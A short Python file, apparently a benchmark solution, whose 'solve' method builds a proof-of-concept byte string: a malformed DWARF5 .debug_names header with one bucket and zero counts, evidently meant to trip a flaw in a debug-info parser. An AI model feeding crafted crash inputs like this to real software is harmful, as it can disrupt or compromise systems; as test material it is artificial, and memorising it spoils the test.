import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = struct.pack('<I', 32)
        poc += struct.pack('<H', 5)
        poc += b'\x00'
        poc += b'\x00' * 4 * 3  # cu_count, local_tu_count, foreign_tu_count = 0
        poc += struct.pack('<I', 1)  # bucket_count = 1
        poc += b'\x00' * 4 * 3  # name_count, abbrev_table_size, entry_pool_size = 0
        poc += b'\x00'  # augmentation string (empty)
        return poc